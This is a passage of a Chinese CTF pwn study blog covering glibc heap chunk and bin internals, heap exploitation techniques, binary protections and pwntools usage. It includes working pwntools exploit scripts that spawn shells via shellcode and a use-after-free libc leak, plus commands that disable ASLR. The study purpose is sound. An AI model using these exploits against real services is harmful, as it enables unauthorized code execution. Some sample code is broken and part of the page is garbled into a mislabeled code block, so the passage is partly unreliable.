class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+<p><strong>Chunk 的微观结构</strong></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/f413c33c3ae06f075ec468bd03944c3b.png" srcset="/img/loading.gif" lazyload alt="image-20220419225208374" style="zoom:80%;"></p>
+<ul>
+<li><p><strong>prev_size</strong></p>
+<p>若前一个物理相邻的chunk是free chunk，则表示其大小。否则用于存储前一个chunk的数据</p>
+</li>
+<li><p><strong>size</strong><br>占据一字长的低3bits以后的地址，用于表示当前chunk的大小（整个chunk的大小，包括chunk头）</p>
+<ul>
+<li><p><strong>A flag</strong></p>
+<p>NON_MAIN_ARENA，记录当前 chunk是否不属于主线程，1 表示不属于，0 表示属于。</p>
+</li>
+<li><p><strong>M flag</strong></p>
+<p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
+</li>
+<li><p><strong>P flag</strong></p>
+<p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>fd</strong> <strong>pointer</strong></p>
+<p>在bin中指向下一个（非物理相邻）空闲的 chunk</p>
+</li>
+<li><p><strong>bk pointer</strong></p>
+<p>在bin中指向上一个（非物理相邻）空闲的 chunk</p>
+</li>
+<li><p><strong>fd_nextsize</strong></p>
+<p>在large bin中指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</p>
+</li>
+<li><p><strong>bk_nextsize</strong></p>
+<p>在large bin中指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</p>
+</li>
+</ul>
+<p><strong>chunk 的分类</strong></p>
+<ul>
+<li>按状态<ul>
+<li>malloced、free</li>
+</ul>
+</li>
+<li>按大小<ul>
+<li>fast、small、large、Tcache</li>
+</ul>
+</li>
+<li>按特定功能<ul>
+<li>top chunk、last remainder chunk</li>
+</ul>
+</li>
+</ul>
+<p><strong>malloced chunk</strong></p>
+<p>已被分配且填写了相应数据的chunk</p>
+<p><strong>free chunk</strong></p>
+<p>被释放掉的malloced chunk成为free chunk</p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/007246579d4638f458a96dfe45e69878.png" srcset="/img/loading.gif" lazyload alt="image-20220423170006917" style="zoom:80%;"></p>
+<p><strong>top chunk</strong></p>
+<p>arena中从未被使用过的内存区域</p>
+<p><strong>last remainder chunk</strong></p>
+<p>malloc分割原chunk后剩余的部分</p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/60c09d89839cba6692edf6ed05dda6fa.png" srcset="/img/loading.gif" lazyload alt="image-20220423170123790" style="zoom: 80%;"></p>
+<h4 id="4、Bin"><a href="#4、Bin" class="headerlink" title="4、Bin"></a>4、Bin</h4><p><strong>bin</strong></p>
+<p>管理 arena 中空闲 chunk 的结构，以数组的形式存在，数组元素为相应大小的 chunk 链表的链表头，存在于 arena 的 malloc_state 中</p>
+<ul>
+<li>unsorted bin </li>
+<li>fast bins </li>
+<li>small bins </li>
+<li>large bins </li>
+<li>(tcache)</li>
+</ul>
+<p><strong>main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    <span class="hljs-comment">/* Serialize access.  */</span><br>    __libc_lock_define(, mutex);     <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>    <span class="hljs-keyword">int</span> flags;     <span class="hljs-comment">/* Fastbins */</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];     <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>    mchunkptr top;     <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>    mchunkptr last_remainder;     <span class="hljs-comment">/* Normal bins packed as described above */</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];     <span class="hljs-comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[ BINMAPSIZE ];     <span class="hljs-comment">/* Linked list, points to the next arena */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span>     <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">       by free_list_lock in arena.c.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span>     <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">       the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">       free_list_lock in arena.c.  */</span><br>    INTERNAL_SIZE_T attached_threads;     <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>    INTERNAL_SIZE_T system_mem;<br>    INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure>
+<p><strong>fast bins</strong></p>
+<ul>
+<li>fastbinsY[] </li>
+<li>单向列表 </li>
+<li>LIFO </li>
+<li>管理 16、24、32、40、48、56、64 Bytes 的 free chunks（32位下默认） </li>
+<li>其中的 chunk 的 in_use 位（下一个物理相邻的 chunk 的 P 位）总为1</li>
+</ul>
+<p><strong>unsorted bin</strong></p>
+<ul>
+<li>bins[1] </li>
+<li>管理刚刚释放还为分类的 chunk </li>
+<li>可以视为空闲 chunk 回归其所属 bin 之前的缓冲区</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/54e4b933e1086824764223268ace0abe.png" srcset="/img/loading.gif" lazyload alt="image-20220423175224911" style="zoom: 80%;"></p>
+<p><strong>small bins</strong></p>
+<ul>
+<li>bins[2] ~ bins[63] </li>
+<li>62 个循环双向链表 </li>
+<li>FIFO </li>
+<li>管理 16、24、32、40、 …… 、504 Bytes 的 free chunks（32位下） </li>
+<li>每个链表中存储的 chunk 大小都一致</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/b4fd5537b92cc815878bcb2574ab0010.png" srcset="/img/loading.gif" lazyload alt="image-20220423175256873"></p>
+<p><strong>large</strong> <strong>bins</strong></p>
+<ul>
+<li>bins[64] ~ bins[126] </li>
+<li>63 个循环双向链表</li>
+<li>FIFO </li>
+<li>管理大于 504 Bytes 的 free chunks（32位下）</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/3e6f2356d12da082555942f13df1ba50.png" srcset="/img/loading.gif" lazyload alt="image-20220423175314579"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/08bd5ce100e57ccec6befeca4509d96d.png" srcset="/img/loading.gif" lazyload alt="7a9ddc1e5bc248168cb6781adab19d8f" style="zoom: 80%;"></p>
+<h3 id="二、堆分配策略"><a href="#二、堆分配策略" class="headerlink" title="二、堆分配策略"></a>二、堆分配策略</h3><h4 id="1、Malloc"><a href="#1、Malloc" class="headerlink" title="1、Malloc"></a>1、Malloc</h4><ul>
+<li>它根据用户申请的内存块大小以及相应大小 chunk 通常使用的频度（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li>
+<li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li>
+<li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li>
+<li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li>
+</ul>
+<h4 id="2、free"><a href="#2、free" class="headerlink" title="2、free"></a>2、free</h4><ul>
+<li>它将用户暂且不用的 chunk 回收给堆管理器，适当的时候还会归还给操作系统。</li>
+<li>它依据 chunk 大小来优先试图将 free chunk 链入 tcache 或者是 fast bin 。不满足则链入 usorted bin 中。</li>
+<li>在条件满足时 free 函数遍历 usorted bin 并将其中的物理相邻的 free chunk 合并，将相应大小的 chunk 分类放入 small bin 或 large bin 中。</li>
+<li>除了 tcache chunk 与 fast bin chunk，其它 chunk 在 free 时会与其物理相邻的 free chunk 合并</li>
+</ul>
+<h3 id="三、堆漏洞与其利用"><a href="#三、堆漏洞与其利用" class="headerlink" title="三、堆漏洞与其利用"></a>三、堆漏洞与其利用</h3><h4 id="1、use-after-free（释放重用攻击）"><a href="#1、use-after-free（释放重用攻击）" class="headerlink" title="1、use after free（释放重用攻击）"></a>1、use after free（释放重用攻击）</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/af5d7231bce0364ac6cb4d7d407db035.png" srcset="/img/loading.gif" lazyload alt="image-20220427144438898" style="zoom:67%;"></p>
+<h4 id="2、double-free"><a href="#2、double-free" class="headerlink" title="2、double free"></a>2、double free</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/675908db3c8603e919bcba830a444931.png" srcset="/img/loading.gif" lazyload alt="image-20220427144522013" style="zoom:67%;"></p>
+<h4 id="3、fastbin-attack"><a href="#3、fastbin-attack" class="headerlink" title="3、fastbin attack"></a>3、fastbin attack</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/082108bfc6e91b9a3a0c37f05e17699e.png" srcset="/img/loading.gif" lazyload alt="image-20220427144554285" style="zoom:67%;"></p>
+<h4 id="4、unsortedbin-attack"><a href="#4、unsortedbin-attack" class="headerlink" title="4、unsortedbin attack"></a>4、unsortedbin attack</h4><ul>
+<li><p>被利用的前提：控制 Unsorted Bin Chunk 的 bk 指针。</p>
+</li>
+<li><p>可以达到的效果：实现修改任意地址值为一个较大的数值。</p>
+</li>
+<li><p>可能的用途：通常是为了配合 fastbin attack 而使用的。</p>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/46e4f9d4bcefa81f6485b5d363106bcb.png" srcset="/img/loading.gif" lazyload alt="image-20220427144641452" style="zoom:67%;"></p>
+<h4 id="5、house-of-（堆溢出、整数溢出）"><a href="#5、house-of-（堆溢出、整数溢出）" class="headerlink" title="5、house of    （堆溢出、整数溢出）"></a>5、house of    （堆溢出、整数溢出）</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/7ab0f45f7dfc8fd55b2d126479688366.png" srcset="/img/loading.gif" lazyload alt="image-20220427144725001" style="zoom:67%;"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(var)</span>  <span class="hljs-comment">//0x4002c7</span></span><br><span class="hljs-function"></span>&#123;<br>    print(<span class="hljs-string">&quot;%d\n&quot;</span>,var);<br>    return0;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    (<span class="hljs-number">0x4002c7</span>)(var);  <span class="hljs-comment">// = fun(var);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb a.out</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> vmmap</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> fastbin</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> heap</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> p ptr</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *<span class="hljs-variable">$rebase</span>(0x18540)   <span class="hljs-comment"># 偏移地址</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> vim exp.py</span><br><span class="hljs-meta">#</span><span class="bash"> 添加pause</span><br><span class="hljs-meta">$</span><span class="bash"> python3 exp.py</span><br><span class="hljs-meta">$</span><span class="bash"> gdb</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> attach pid</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> <span class="hljs-built_in">return</span></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./echo2&quot;</span>)<br>elf=ELF(<span class="hljs-string">&quot;./echo2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;hey, what&#x27;s your name? : &quot;</span>)<br>shellcode=<span class="hljs-string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br>p.sendline(shellcode)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br><br>payload=<span class="hljs-string">b&quot;%10$p&quot;</span>+<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">3</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>shellcode_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;AAA&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x20</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;to exit? (y/n)&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;hello \n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">24</span>+p64(shellcode_addr))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p=process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br>pfputs = <span class="hljs-number">0x804862b</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_note</span>(<span class="hljs-params">size,index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;size :&quot;</span>)<br>      p.sendline(size)<br>      p.recvuntil(<span class="hljs-string">b&quot;Content :&quot;</span>)<br>      p.sendline(index)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params">index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>      p.sendline(index)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_note</span>(<span class="hljs-params">index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>      p.sendline(index)<br><br>add_note(<span class="hljs-string">b&quot;16&quot;</span>,<span class="hljs-string">b&quot;aaaaa&quot;</span>)<br>add_note(<span class="hljs-string">b&quot;16&quot;</span>,<span class="hljs-string">b&quot;aaaaa&quot;</span>)<br>delete_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>delete_note(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add_note(<span class="hljs-string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))<br>print_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>pfread = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>pfsys = pfread - <span class="hljs-number">0xd41c0</span> + <span class="hljs-number">0x3a940</span><br><br>delete_note(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>add_note(<span class="hljs-string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="hljs-string">b&quot;||sh&quot;</span>)<br>print_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="PartEx1-内存保护措施"><a href="#PartEx1-内存保护措施" class="headerlink" title="PartEx1 内存保护措施"></a>PartEx1 内存保护措施</h2><p><strong>compile.sh：</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># Canary、栈可执行、PIE</span><br>gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c<br></code></pre></td></tr></table></figure>
+<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><blockquote>
+<p>ASLR (Address Space Layout Randomization)</p>
+</blockquote>
+<ul>
+<li><p>系统的防护措施，程序装载时生效</p>
+<ul>
+<li>/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR</li>
+<li>/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化</li>
+<li>/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在randomize_va_space = 1的基础上，通过 brk() 分配的内存空间也将被随机化</li>
+</ul>
+</li>
+<li><p>```shell<br>$ su<br>$ echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>$ cat /proc/sys/kernel/randomize_va_space</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br><br><br>### PIE<br><br>&gt; PIE (Position-Independent Executable)<br><br>-<span class="ruby"> 程序的防护措施，编译时生效</span><br><span class="ruby"></span><br>-<span class="ruby"> 随机化ELF文件的映射地址</span><br><span class="ruby"></span><br>-<span class="ruby"> 开启 ASLR 之后，PIE 才会生效</span><br><span class="ruby"></span><br><br><br>### The NX bits<br><br>&gt; The NX bits (the No-eXecute bits)<br><br>-<span class="ruby"> 程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现</span><br><span class="ruby"></span><br>-<span class="ruby"> 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃</span><br><span class="ruby"></span><br>&lt;img src=&quot;Pwn/537371648ede66c371eb4d76cd2ffd9b.png&quot; alt=&quot;image-20220410140915940&quot; style=&quot;zoom: 67%;&quot; /&gt;<br><br><br><br>### Canary<br><br>-<span class="ruby"> 程序的防护措施，编译时生效</span><br><span class="ruby"></span><br>-<span class="ruby"> 在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的</span><br><span class="ruby"></span><br>-<span class="ruby"> canary长度为<span class="hljs-number">1</span>字长，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作</span><br><span class="ruby"></span><br><br><br>### RELRO<br><br>&gt; RELRO (RELocate Read-Only)<br><br>-<span class="ruby"> 程序的防护措施，编译时生效</span><br><span class="ruby"></span><br>-<span class="ruby"> 部分 <span class="hljs-symbol">RELRO:</span> 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改</span><br><span class="ruby"></span><br>-<span class="ruby"> 完全 <span class="hljs-symbol">RELRO:</span> 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址</span><br><span class="ruby"></span><br><br><br>## PartEx2 PWN Tools<br><br>-<span class="ruby"> IDA Pro</span><br><span class="ruby"></span><br>-<span class="ruby"> pwntools</span><br><span class="ruby"></span>-<span class="ruby"> pwndbg</span><br><span class="ruby"></span>-<span class="ruby"> checksec</span><br><span class="ruby"></span>-<span class="ruby"> ROPgadget</span><br><span class="ruby"></span>-<span class="ruby"> one_gadget</span><br><span class="ruby"></span>-<span class="ruby"> LibcSearcher</span><br><span class="ruby"></span>-<span class="ruby"> main_arena_offset</span><br><span class="ruby"></span><br><br><br>### Pwn tools<br><br>-<span class="ruby"> VMware</span><br><span class="ruby"></span>  -<span class="ruby"> deepin</span><br><span class="ruby"></span>  -<span class="ruby"> Ubuntu</span><br><span class="ruby"></span>  -<span class="ruby"> kali</span><br><span class="ruby"></span>-<span class="ruby"> WSL</span><br><span class="ruby"></span>-<span class="ruby"> shell</span><br><span class="ruby"></span>  -<span class="ruby"> zsh</span><br><span class="ruby"></span>-<span class="ruby"> vim</span><br><span class="ruby"></span>  -<span class="ruby"> %!xxd</span><br><span class="ruby"></span>  -<span class="ruby"> %!xxd -r</span><br><span class="ruby"></span>-<span class="ruby"> python</span><br><span class="ruby"></span>-<span class="ruby"> gdb</span><br><span class="ruby"></span>  -<span class="ruby"> pwndbg</span><br><span class="ruby"></span><br><br><br>-<span class="ruby"> IDA Pro</span><br><span class="ruby"></span>  -<span class="ruby"> 反汇编，静态分析</span><br><span class="ruby"></span>  -<span class="ruby"> F5：反编译（C语言）</span><br><span class="ruby"></span>  -<span class="ruby"> Shift + F12 ：查找字符串</span><br><span class="ruby"></span>  -<span class="ruby"> G：地址调转</span><br><span class="ruby"></span>  -<span class="ruby"> 空格键：进入汇编代码视图</span><br><span class="ruby"></span>  -<span class="ruby"> n：更改变量的名称</span><br><span class="ruby"></span>  -<span class="ruby"> /：注释</span><br><span class="ruby"></span>  -<span class="ruby"> R：</span><br><span class="ruby"></span>-<span class="ruby"> pwntools</span><br><span class="ruby"></span>  -<span class="ruby"> python模块</span><br><span class="ruby"></span>  -<span class="ruby"> pip install pwntools</span><br><span class="ruby"></span>  -<span class="ruby"> from pwn import *</span><br><span class="ruby"></span>  -<span class="ruby"> LibSearcher，依附于python2</span><br><span class="ruby"></span>  -<span class="ruby"> pip --proxy ，使用代理</span><br><span class="ruby"></span><br><br><br>```python<br>from pwn import *<br><br>io = process(&quot;./test&quot;)<br>io = remote(&quot;106.54.129.202&quot;,10002)<br><br>io.recvline()<br>io.recv()<br><br># 字节流<br>io.send(b&quot;abcdefg&quot;)<br>io.send(p64(1))<br>io.send(p32(1))<br>io.send(p32(1) + b&quot;abcdefg&quot;)<br>io.send(p32(1) + b&quot;\x0a&quot;)  # 0x0a、10、\n<br>io.sendline(b&quot;abcdefg&quot;)<br>io.send(b&quot;abcdefg\n&quot;)<br><br># 打包、解包<br>p32(1234)<br>u32(b&#x27;\xc06&#x27;)<br><br># 转化<br>hex(ord(&#x27;#&#x27;))  # 0x23<br>chr(0x23)      # #<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>pwndbg<ul>
+<li>gdb插件，用于动态调试</li>
+<li>栈使用情况</li>
+<li>peda、gef、pwndbg</li>
+<li>使用：gdb a.out</li>
+</ul>
+</li>
+</ul>
+<p>用 gdb 查看内存：</p>
+<blockquote>
+<p>可以使用 examine 命令（简写是 x ）来查看内存地址中的值。</p>
+<p>格式：x/<nfu> <addr></addr></nfu></p>
+</blockquote>
+<ul>
+<li>说明：x 是 examine 的缩写，n、f、u是可选的参数</li>
+<li>n 是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容<ul>
+<li>一个内存单元的大小由后面的 u 定义。</li>
+</ul>
+</li>
